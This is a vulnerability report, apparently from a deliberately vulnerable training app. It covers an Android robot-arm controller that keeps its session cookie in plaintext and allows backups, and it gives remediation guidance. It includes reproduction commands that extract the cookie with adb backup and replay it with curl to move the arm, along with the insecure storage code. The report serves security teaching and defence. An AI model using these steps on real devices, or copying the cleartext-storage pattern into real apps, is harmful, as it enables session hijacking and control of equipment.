---
id: M9
title: "Insecure Data Storage (Backup-Extractable Plaintext Session Cookie)"
category: Mobile
status: IN PROGRESS
severity: Medium
owasp: "OWASP Mobile Top 10: M9 — Insecure Data Storage"
cwe: "CWE-312 (Cleartext Storage of Sensitive Information) / CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)"
source_docs:
  - "src/docs/OctoBot/Vulns/Mobile/M5_Insecure_Communication.md"
  - "src/docs/OctoBot/Vulns/API/API5_Broken_Function_Level_Authorization.md"
affected_components:
  - "vulnzoo_apps/octobot_app/app/src/main/AndroidManifest.xml"
  - "vulnzoo_apps/octobot_app/app/src/main/res/xml/backup_rules.xml"
  - "vulnzoo_apps/octobot_app/app/src/main/res/xml/data_extraction_rules.xml"
  - "vulnzoo_apps/octobot_app/app/src/main/java/com/vulnzoo/octobot_app/LoginActivity.java"
verified_date: ""
---

## Why It Matters

The app stores the Flask session cookie in plaintext `SharedPreferences` and leaves Android auto-backup enabled with no exclusion rules. Anyone who can trigger a backup or read the app's data directory recovers a live operator session cookie, which grants control of the robot arm through the authenticated cloud API without ever knowing the operator password. A session token is a credential, and here it sits at rest in cleartext in a backup-extractable location.

## Root Cause

The manifest enables auto-backup and points at the default rule files:

```xml
<!-- vulnzoo_apps/octobot_app/app/src/main/AndroidManifest.xml -->
android:allowBackup="true"
```

Both backup rule files are the unmodified Android Studio templates with every rule commented out, so nothing is excluded from backup:

```xml
<!-- res/xml/data_extraction_rules.xml -->
<data-extraction-rules>
    <cloud-backup>
        <!-- TODO: Use <include> and <exclude> to control what is backed up. -->
    </cloud-backup>
</data-extraction-rules>
```

The app writes the session cookie into `SharedPreferences` as cleartext, alongside the server address:

```java
// vulnzoo_apps/octobot_app/app/src/main/java/com/vulnzoo/octobot_app/LoginActivity.java
static final String PREFS      = "octobot_prefs";
static final String KEY_COOKIE = "session_cookie";  // "session=..."
...
getSharedPreferences(PREFS, MODE_PRIVATE).edit()
        .putString(KEY_SERVER, server)
        .putString(KEY_COOKIE, cookie)
        .apply();
```

`ControlActivity` reads that same cookie back and replays it on every request, so a recovered `octobot_prefs.xml` is a directly usable credential. There is no `EncryptedSharedPreferences`, no Keystore-backed encryption, and no backup exclusion.

## Steps to Reproduce

1. With the app logged in on a device, trigger an app backup (the account was authenticated at least once, so `octobot_prefs` holds a cookie):

```bash
adb backup -f octobot.ab -noapk com.vulnzoo.octobot_app
```

2. Unpack the Android backup archive (strip the 24-byte header and inflate, or use `android-backup-extractor`):

```bash
dd if=octobot.ab bs=24 skip=1 | zlib-flate -uncompress > octobot.tar   # or: java -jar abe.jar unpack octobot.ab octobot.tar
tar -xf octobot.tar
```

3. Read the stored preferences and recover the session cookie in cleartext:

```bash
cat apps/com.vulnzoo.octobot_app/sp/octobot_prefs.xml
# <string name="session_cookie">session=eyJ1c2VyIjoib3BlcmF0b3IifQ...</string>
# <string name="server">192.168.2.2:5002</string>
```

4. Replay it to control the arm with no password:

```bash
curl -s -X POST http://192.168.2.2:5002/api/servo/1 \
     -H 'Content-Type: application/json' -H 'Cookie: <recovered cookie>' \
     -d '{"angle":90}'
```

On a rooted device or an emulator the same file is readable directly at `/data/data/com.vulnzoo.octobot_app/shared_prefs/octobot_prefs.xml`, without a backup.

## Expected Result

The session cookie is stored in cleartext in `octobot_prefs.xml`, the app allows backup with no exclusion rules, and a backup (or a read of the data directory) yields a session cookie that authorizes the cloud control API with no credentials.

## How It Should Be

Do not persist the raw session cookie. If it must be cached, store it with `EncryptedSharedPreferences` backed by the Android Keystore. Set `android:allowBackup="false"`, or add an explicit `<exclude domain="sharedpref" path="octobot_prefs.xml"/>` to both backup rule files so the token is never captured. Prefer a short-lived token with server-side revocation so a stolen copy expires quickly.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Storage | `EncryptedSharedPreferences` (Keystore-backed) | No cleartext token at rest |
| Backup | `allowBackup="false"` or exclude the prefs file | Keep the token out of backups |
| Token | Short-lived, server-revocable session | Limit the value of a recovered cookie |

## Verification Checklist

- [ ] `AndroidManifest.xml` sets `allowBackup="true"`
- [ ] `backup_rules.xml` and `data_extraction_rules.xml` define no active `<exclude>` (default templates)
- [ ] `octobot_prefs.xml` stores `session_cookie` in cleartext
- [ ] An `adb backup` (or data-dir read on a rooted device) recovers the cookie
- [ ] The recovered cookie authorizes `/api/servo` / `/api/command`

## Related Vulnerabilities

- [M5 — Insecure Communication](M5_Insecure_Communication.md): the same session cookie also crosses the network in cleartext, so it is recoverable in transit as well as at rest.
- [API5:2023 — Broken Function Level Authorization](../API/API5_Broken_Function_Level_Authorization.md): a recovered operator session reaches the authenticated `/api/v2/firmware` upload path.
- [M8 — Security Misconfiguration](M8_Security_Misconfiguration.md): the same app also leaks the API versioning surface before login.
